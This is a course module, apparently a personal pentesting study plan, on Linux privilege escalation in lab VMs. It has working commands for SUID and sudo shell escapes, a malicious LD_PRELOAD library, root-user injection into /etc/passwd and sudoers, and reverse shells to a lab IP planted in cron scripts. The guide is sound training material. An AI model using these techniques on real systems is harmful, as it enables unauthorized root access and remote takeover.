# 🐧 Phase 4: Linux Privilege Escalation (Week 5-6)

> **Goal**: Escalate from a low-privilege user to root using multiple techniques.
> **Your existing notes**: `linux_prev_esca/` folder

---

## 📋 Table of Contents

1. [Setup & Targets](#1-setup--targets)
2. [Manual Enumeration](#2-manual-enumeration)
3. [Kernel Exploits](#3-kernel-exploits)
4. [SUID/SGID Abuse](#4-suidsgid-abuse)
5. [Sudo Abuse](#5-sudo-abuse)
6. [Cron Job Exploitation](#6-cron-job-exploitation)
7. [Weak File Permissions](#7-weak-file-permissions)
8. [PATH Hijacking](#8-path-hijacking)
9. [Capabilities Abuse](#9-capabilities-abuse)
10. [NFS & Services Exploitation](#10-nfs--services-exploitation)
11. [Automated Enumeration Tools](#11-automated-enumeration-tools)
12. [Practice on Online Platforms](#12-practice-on-online-platforms)
13. [Weekly Schedule](#13-weekly-schedule)
14. [Checklist & Progress Tracker](#14-checklist--progress-tracker)

---

## 1. Setup & Targets

| Target                         | Where to Get      | Skills                     |
| ------------------------------ | ----------------- | -------------------------- |
| **Metasploitable 2**           | Already in lab    | Basic Linux PrivEsc        |
| **Kioptrix Level 1-5**         | vulnhub.com       | Progressive difficulty     |
| **DC-1**                       | vulnhub.com       | Drupal + Linux PrivEsc     |
| **Toppo**                      | vulnhub.com       | Beginner PrivEsc           |
| **Linux PrivEsc Arena**        | TryHackMe (free)  | All techniques             |
| **LinEnum Practice**           | TryHackMe (free)  | Enumeration                |
| **Exploit Education: Phoenix** | exploit.education | Buffer overflows + PrivEsc |
| **OverTheWire: Bandit**        | overthewire.org   | Linux fundamentals         |

### Setting Up VulnHub VMs

```
1. Download the .ova/.vmdk file from vulnhub.com
2. Import into VirtualBox: File → Import Appliance
3. Set network adapter to "Internal Network" → hacklab
4. Boot the VM
5. Find it: nmap -sn 192.168.56.0/24
6. Enumerate → Exploit → Escalate!
```

---

## 2. Manual Enumeration

> **First step after getting a shell — always enumerate!**

### 2.1 — System Information

```bash
whoami                              # Current user
id                                  # User ID, groups
hostname                            # Machine name
uname -a                            # Kernel version
cat /etc/os-release                 # OS version
cat /proc/version                   # Kernel details
arch                                # Architecture
```

### 2.2 — User & Group Enumeration

```bash
cat /etc/passwd                     # All users
cat /etc/passwd | grep "bash"       # Users with shells
cat /etc/passwd | grep -v "nologin" # Users that can login
cat /etc/shadow                     # Password hashes (if readable!)
cat /etc/group                      # All groups
last                                # Recent logins
w                                   # Who's currently logged in
```

### 2.3 — Privilege Checks

```bash
sudo -l                             # What can I run as sudo?
cat /etc/sudoers                    # Sudoers file (if readable)
find / -perm -4000 -type f 2>/dev/null  # SUID binaries
find / -perm -2000 -type f 2>/dev/null  # SGID binaries
getcap -r / 2>/dev/null             # Capabilities
```

### 2.4 — Filesystem Enumeration

```bash
find / -writable -type d 2>/dev/null    # Writable directories
find / -writable -type f 2>/dev/null    # Writable files
find / -name "*.conf" 2>/dev/null | head -20
find / -name "*.bak" 2>/dev/null
find / -name "*.log" 2>/dev/null | head -20
find / -name "*.txt" -path "*/home/*" 2>/dev/null
find / -name ".ssh" 2>/dev/null
find / -name "id_rsa" 2>/dev/null       # SSH private keys
find / -nouser 2>/dev/null              # Files with no owner
ls -la /tmp /var/tmp /dev/shm           # Temp directories
```

### 2.5 — Network & Process Information

```bash
ifconfig                            # Network interfaces
ip a                                # Alternative
netstat -tlnp                       # Listening ports
ss -tlnp                            # Modern alternative
ps aux                              # All running processes
ps aux | grep root                  # Root processes
cat /etc/crontab                    # Cron jobs
ls -la /etc/cron*                   # Cron directories
env                                 # Environment variables
echo $PATH                          # PATH variable
cat /etc/fstab                      # Mounted filesystems
mount                               # Currently mounted
df -h                               # Disk usage
```

---

## 3. Kernel Exploits

```bash
# Step 1: Check kernel version
uname -r

# Step 2: Search for exploits
searchsploit "linux kernel $(uname -r)"
searchsploit "linux kernel 2.6"

# Step 3: Metasploitable runs Linux 2.6.24 — known exploits:
# DirtyCow (CVE-2016-5195) — works on kernel < 4.8.3
# DirtyPipe (CVE-2022-0847) — works on kernel 5.8-5.16.11

# Step 4: Example — compile and run
searchsploit -m linux/local/40839.c
# Transfer to target
gcc 40839.c -o exploit -pthread
./exploit

# ⚠️ CAUTION: Kernel exploits may crash the target. Use as last resort!
```

> 🔗 **Linux Exploit Suggester**: https://github.com/The-Z-Labs/linux-exploit-suggester
> ```bash
> ./linux-exploit-suggester.sh
> ```

---

## 4. SUID/SGID Abuse

```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Check GTFOBins for each binary found
# https://gtfobins.github.io/#+suid

# Common exploitable SUID binaries:
```

| Binary                | Exploit Command                                        |
| --------------------- | ------------------------------------------------------ |
| `/usr/bin/find`       | `find . -exec /bin/sh -p \;`                           |
| `/usr/bin/vim`        | `vim -c ':!/bin/sh'`                                   |
| `/usr/bin/nmap` (old) | `nmap --interactive` → `!sh`                           |
| `/usr/bin/less`       | `less /etc/shadow` → `!/bin/sh`                        |
| `/usr/bin/python`     | `python -c 'import os; os.execl("/bin/sh","sh","-p")'` |
| `/usr/bin/bash`       | `bash -p`                                              |
| `/usr/bin/env`        | `env /bin/sh -p`                                       |
| `/usr/bin/cp`         | Copy `/etc/passwd` → add root user → copy back         |
| `/usr/bin/wget`       | Download malicious `/etc/passwd` → overwrite           |

```bash
# Exercise: On Metasploitable, find and exploit SUID binaries
find / -perm -4000 -type f 2>/dev/null

# For each binary:
# 1. Note the binary path
# 2. Search GTFOBins
# 3. Try the SUID exploitation method
# 4. Check: did you get root? (whoami)
```

---

## 5. Sudo Abuse

```bash
# Check sudo permissions
sudo -l

# Common sudo misconfigurations:
```

| Sudo Entry                        | Exploit                                              |
| --------------------------------- | ---------------------------------------------------- |
| `(ALL) NOPASSWD: /usr/bin/vim`    | `sudo vim -c ':!/bin/bash'`                          |
| `(ALL) NOPASSWD: /usr/bin/less`   | `sudo less /etc/shadow` → `!/bin/bash`               |
| `(ALL) NOPASSWD: /usr/bin/find`   | `sudo find / -exec /bin/bash \;`                     |
| `(ALL) NOPASSWD: /usr/bin/awk`    | `sudo awk 'BEGIN {system("/bin/bash")}'`             |
| `(ALL) NOPASSWD: /usr/bin/python` | `sudo python -c 'import os; os.system("/bin/bash")'` |
| `(ALL) NOPASSWD: /usr/bin/perl`   | `sudo perl -e 'exec "/bin/bash"'`                    |
| `(ALL) NOPASSWD: /usr/bin/ruby`   | `sudo ruby -e 'exec "/bin/bash"'`                    |
| `(ALL) NOPASSWD: /usr/bin/man`    | `sudo man man` → `!/bin/bash`                        |
| `(ALL) NOPASSWD: /usr/bin/env`    | `sudo env /bin/bash`                                 |
| `(ALL) NOPASSWD: /usr/bin/ftp`    | `sudo ftp` → `!/bin/bash`                            |

> 🔗 **GTFOBins Sudo Section**: https://gtfobins.github.io/#+sudo

### LD_PRELOAD Trick

```bash
# If sudo -l shows: env_keep+=LD_PRELOAD
# Create malicious shared library:
cat > /tmp/shell.c << EOF
#include <stdio.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setresuid(0,0,0);
    system("/bin/bash -p");
}
EOF
gcc -fPIC -shared -nostartfiles -o /tmp/shell.so /tmp/shell.c
sudo LD_PRELOAD=/tmp/shell.so <any_allowed_command>
```

---

## 6. Cron Job Exploitation

```bash
# Step 1: Check cron jobs
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
crontab -l                          # Current user's cron
ls -la /var/spool/cron/

# Step 2: Find writable scripts executed by root
# Look for scripts in crontab run as root
# Check if you can write to those scripts

# Step 3: If you find a writable cron script, add reverse shell
echo 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1' >> /opt/cleanup.sh

# Step 4: Listen on Kali
nc -lvnp 4444

# Step 5: Wait for cron to execute → root shell!
```

### Wildcard Injection

```bash
# If cron runs: tar czf /tmp/backup.tar.gz *
# In the directory being backed up:
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1' > shell.sh
# When tar runs, it interprets filenames as arguments!
```

### PATH Abuse with Cron

```bash
# If crontab has: PATH=/home/user:/usr/bin:/bin
# And cron runs a command WITHOUT absolute path, e.g., "cleanup"
# Create your own "cleanup" in /home/user/
echo '#!/bin/bash\nbash -i >& /dev/tcp/192.168.56.10/4444 0>&1' > /home/user/cleanup
chmod +x /home/user/cleanup
```

---

## 7. Weak File Permissions

```bash
# Check if /etc/shadow is readable
ls -la /etc/shadow
cat /etc/shadow
# If readable → copy hashes → crack with John/Hashcat!

# Check if /etc/passwd is writable
ls -la /etc/passwd
# If writable → add a root user!
openssl passwd -1 -salt evil password123
echo 'evilroot:$1$evil$<hash>:0:0::/root:/bin/bash' >> /etc/passwd
su evilroot

# Check if /etc/sudoers is writable
ls -la /etc/sudoers
# If writable:
echo 'yourusername ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers

# Find world-writable files owned by root
find / -writable -type f -user root 2>/dev/null

# Find SSH keys
find / -name "authorized_keys" 2>/dev/null
find / -name "id_rsa" 2>/dev/null
# If found, copy and use: ssh -i id_rsa root@target
```

---

## 8. PATH Hijacking

```bash
# If a SUID binary or root process calls a command without full path:
# Example: a SUID binary runs "service apache start"

# Step 1: Create malicious "service" script
echo '#!/bin/bash\n/bin/bash -p' > /tmp/service
chmod +x /tmp/service

# Step 2: Prepend /tmp to PATH
export PATH=/tmp:$PATH

# Step 3: Run the SUID binary → it finds YOUR "service" first
./vulnerable_suid_binary
# You now have root!
```

---

## 9. Capabilities Abuse

```bash
# Find binaries with capabilities
getcap -r / 2>/dev/null

# Common exploitable capabilities:
```

| Binary + Capability            | Exploit                                                        |
| ------------------------------ | -------------------------------------------------------------- |
| `python3 = cap_setuid+ep`      | `python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'` |
| `perl = cap_setuid+ep`         | `perl -e 'use POSIX; setuid(0); exec "/bin/bash"'`             |
| `vim = cap_setuid+ep`          | `:py3 import os; os.setuid(0)` → `:!/bin/bash`                 |
| `tar = cap_dac_read_search+ep` | `tar czf /tmp/shadow.tar.gz /etc/shadow`                       |

---

## 10. NFS & Services Exploitation

### NFS (Network File System)

```bash
# Check for NFS exports
cat /etc/exports
showmount -e 192.168.56.20

# If "no_root_squash" is set:
# On Kali:
mkdir /tmp/nfs
sudo mount -t nfs 192.168.56.20:/share /tmp/nfs
# Create SUID binary as root
sudo cp /bin/bash /tmp/nfs/rootbash
sudo chmod +s /tmp/nfs/rootbash
# On target:
/share/rootbash -p
```

### MySQL Running as Root

```bash
# If MySQL runs as root
mysql -u root -p
# Inside MySQL:
\! /bin/bash
# or use User Defined Functions (UDF)
```

---

## 11. Automated Enumeration Tools

### LinPEAS

```bash
# Download
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh

# Transfer to target (HTTP method)
python3 -m http.server 8080  # On Kali
wget http://192.168.56.10:8080/linpeas.sh  # On target

# Run
chmod +x linpeas.sh
./linpeas.sh | tee linpeas_output.txt

# Focus on: RED and YELLOW highlighted findings
```

### LinEnum

```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh -t
```

### Linux Exploit Suggester

```bash
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh
```

### pspy (Process Spy — finds hidden cron jobs)

```bash
# Download from: https://github.com/DominicBreuker/pspy/releases
./pspy64
# Watch for processes running as root at regular intervals
```

---

## 12. Practice on Online Platforms

| Platform          | Room / VM           | Focus                       | URL               |
| ----------------- | ------------------- | --------------------------- | ----------------- |
| TryHackMe         | Linux PrivEsc       | All techniques (guided)     | tryhackme.com     |
| TryHackMe         | Linux PrivEsc Arena | Practice all methods        | tryhackme.com     |
| TryHackMe         | Linux Agency        | Progressive challenges      | tryhackme.com     |
| VulnHub           | Kioptrix 1          | Easy boot-to-root           | vulnhub.com       |
| VulnHub           | DC-1                | Drupal → root               | vulnhub.com       |
| VulnHub           | Toppo               | Beginner PrivEsc            | vulnhub.com       |
| VulnHub           | Basic Pentesting 1  | Full chain                  | vulnhub.com       |
| OverTheWire       | Bandit 11-20        | Advanced Linux              | overthewire.org   |
| OverTheWire       | Leviathan           | Basic exploitation          | overthewire.org   |
| Exploit Education | Phoenix             | Stack, heap, format strings | exploit.education |
| HackTheBox        | Starting Point      | Free beginner machines      | hackthebox.com    |

---

## 13. Weekly Schedule

### Week 5 — Enumeration & Common PrivEsc

| Day | Activity                                   | Time  |
| --- | ------------------------------------------ | ----- |
| Mon | Manual enumeration on Metasploitable       | 2 hrs |
| Tue | SUID/SGID abuse + GTFOBins practice        | 2 hrs |
| Wed | Sudo abuse — all GTFOBins sudo entries     | 2 hrs |
| Thu | Cron job exploitation + wildcard injection | 2 hrs |
| Fri | Weak file permissions + PATH hijacking     | 2 hrs |
| Sat | TryHackMe: Linux PrivEsc room              | 3 hrs |
| Sun | Run LinPEAS, document 5+ findings          | 1 hr  |

### Week 6 — Advanced PrivEsc & CTFs

| Day | Activity                                     | Time  |
| --- | -------------------------------------------- | ----- |
| Mon | Kernel exploits + Linux Exploit Suggester    | 2 hrs |
| Tue | Capabilities abuse + NFS exploitation        | 2 hrs |
| Wed | VulnHub: Kioptrix Level 1 (full walkthrough) | 3 hrs |
| Thu | VulnHub: DC-1                                | 3 hrs |
| Fri | OverTheWire: Bandit levels 11-20             | 2 hrs |
| Sat | TryHackMe: Linux PrivEsc Arena               | 3 hrs |
| Sun | Write reports for VulnHub machines           | 2 hrs |

---

## 14. Checklist & Progress Tracker

### Manual Enumeration
- [ ] System info (uname, hostname, id)
- [ ] User/group enumeration
- [ ] sudo -l check
- [ ] SUID/SGID binary search
- [ ] Writable files/directories search
- [ ] Cron jobs review
- [ ] Network/process enumeration
- [ ] SSH keys search

### Privilege Escalation Techniques
- [ ] SUID binary exploitation (2+ binaries via GTFOBins)
- [ ] Sudo abuse (3+ binaries via GTFOBins)
- [ ] LD_PRELOAD trick
- [ ] Cron job exploitation
- [ ] Wildcard injection
- [ ] Weak /etc/shadow permissions (crack hashes)
- [ ] Writable /etc/passwd (add root user)
- [ ] PATH hijacking
- [ ] Capabilities abuse
- [ ] NFS no_root_squash exploitation
- [ ] Kernel exploit (at least 1)

### Automated Tools
- [ ] LinPEAS: run and analyze output
- [ ] LinEnum: run and compare with LinPEAS
- [ ] Linux Exploit Suggester: run and review
- [ ] pspy: monitor hidden processes

### Online Platform Practice
- [ ] TryHackMe: Linux PrivEsc room
- [ ] TryHackMe: Linux PrivEsc Arena
- [ ] VulnHub: Kioptrix Level 1 (root obtained)
- [ ] VulnHub: DC-1 (root obtained)
- [ ] OverTheWire: Bandit levels 11-20
- [ ] Written report for at least 1 VulnHub machine

---

> **Previous**: [Phase 3 — File Transfer](../phase_3_file_transfer/file_transfer.md)
> **Next Phase**: [Phase 5 — Windows Privilege Escalation](../phase_5_windows_privesc/windows_privesc.md) 🪟
